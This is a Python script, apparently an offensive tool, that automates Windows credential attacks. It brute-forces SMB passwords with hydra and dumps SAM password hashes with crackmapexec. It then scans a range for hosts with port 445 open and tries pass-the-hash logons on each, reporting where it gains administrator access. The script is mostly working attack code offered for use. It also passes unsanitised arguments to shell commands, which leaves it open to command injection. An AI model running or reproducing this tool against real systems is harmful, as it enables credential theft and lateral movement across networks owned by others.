# -*- coding: utf-8 -*-


import argparse
import re
import shutil
import subprocess
import sys


def hydraPass(ip, username, dictionary):
    """Retrieve password for username in domain controller using hydra

    Args:
        ip (str): IP Address of the domain controller
        username (str): username to crack password of
        dictionary (str): Path to dictionary text file to try passwords
            Text file should have one password per line

    Returns:
        str: String password for the username

    """
    command = 'hydra -l '+ username + ' -P ' + dictionary + ' smb://' + ip + """ | sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mK]//g" | awk '$6 ~ /^password:$/{print $7}'"""
    return subprocess.check_output(command, shell=True).decode("utf-8").strip().split('\n')


def samGrab(ip, username, password):
    """Build list of usernames and hashes using crackmapexec

    Args:
        ip (str): IP address of the domain controller
        username (str): username to log in
        password (str): password to log in

    Returns:
        [str]: list of username and hash pairs as strings in
            crackmapexec format

    """
    command = 'crackmapexec --sam ' + ip + ' -u ' + username + ' -p ' + password + """ | sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mK]//g" | awk '$6 ~ /^.*:::$/{print $6}'"""
    return subprocess.check_output(command, shell=True).decode("utf-8").strip().split('\n')


def osFingerprint(ipRange):
    """Fingerprint machines in ip range using nmap

    Args:
        ipRange (str): String ip address that can specify ranges
            ex. 10.202.208.2 or 10.202.208.2-30

    Returns:
        [str]: list of ip addresses in range running Windows

    """
    command = 'nmap -p 445 --open ' + ipRange
    output = subprocess.check_output(command, shell=True).decode("utf-8").strip().split('\n')
    output = output[2:]
    result = [];
    chunks = [];
    while len(output) > 0:
        if output[0] == '':
            output = output[1:]
        if len(output) == 0:
            continue
        pt = 0
        while pt < len(output) and output[pt] != '':
            pt = pt + 1
        chunks.append(output[0:pt])
        output = output[pt:]
    for c in chunks:
        thisip = re.findall(r'[0-9]+(?:\.[0-9]+){3}', c[0])
        if len(thisip) == 0:
            continue
        windows = False
        for i in range(1, len(c)):
            if windows:
                continue
            if '445/tcp' in c[i]:
                windows = True
        if windows:
            result.append(thisip[0])
    return result


def attemptLogon(hashes, ips):
    """Attempt login to other windows machines using crackmapexec

    Args:
        hashes ([(str, str)]): list of formatted username, hash tuples
        ips ([str]): list of ip address running windows

    Returns:
        {str: str}: dictionary mapping each ip to its login result
            result can be success/fail as well as root/nonroot

    """
    results = {}
    for ip in ips:
        for username, hash in hashes:
            command = 'crackmapexec ' + ip + ' -u ' + username + ' -H ' + hash + """ | sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mK]//g" | awk '{if($6 ~ /^\[-\]$/) {print "Failed"} else if($6 ~ /^\[\+\]$/) {if($9 == "(Pwn3d!)") {print "Root"} else {print "Login"}}}'"""
            result = subprocess.check_output(command,
                    shell=True).decode("utf-8").strip()
            if ip not in results:
                results[ip] = []
            results[ip].append((username, result))
    return results


def formatCrackmapSam(hashes):
    """Format crackmapexec output into usuable data structures

    Args:
        hashes ([str]): list of username, hash pairs seperated by ':'

    Returns:
        [(str, str)]: list of username, hash tuples

    """
    result = []
    for hash in hashes:
        username = ""
        hash_pass = ""
        end_of_username = hash.find(":")
        if end_of_username == -1:
            continue
        username = hash[:end_of_username]
        start_of_hash = hash.find(":", end_of_username+1)
        hash_pass = hash[start_of_hash+1:-3]
        result.append((username, hash_pass))
    return result


def check_executables(executables):
    """Check if required programs are present on system before continuing

    Args:
        executables ([str]): list of exectuable names needed at runtime

    Returns:
        [str]: list of exectuable names that could not be found

    """
    not_found = []
    for executable in executables:
        if shutil.which(executable) == None:
            not_found.append(executable)

    return not_found


def main():
    parser = argparse.ArgumentParser(description='Windows pass the hash hacking')
    parser.add_argument('ip_address', help='ip address of the windows target host')
    parser.add_argument('username', help='username of windows administrator')
    parser.add_argument('password', help='password of windows administrator')
    parser.add_argument('ip_range', help='range of the boxes to attempt to log in to')
    args = parser.parse_args()

    executables = [
        'crackmapexec',
        'sed',
        'awk',
        'nmap'
    ]
    not_found = check_executables(executables)

    if not_found != []:
        joined = ', '.join(not_found)
        print('Missing programs required to run windows-cracker: {}'.format(joined))
        print('Ensure listed programs are in your path before running')
        return 1

    sam_hashes = samGrab(args.ip_address, args.username, args.password)
    print('Hashes acquired')
    ip_addrs = osFingerprint(args.ip_range)
    print('Windows boxes located')
    formatted_sam_hashes = formatCrackmapSam(sam_hashes)
    print('Hashes formatted')
    result_dict = attemptLogon(formatted_sam_hashes, ip_addrs)
    print(result_dict)

    return 0


if __name__ == '__main__':
    return_code = main()
    sys.exit(return_code)
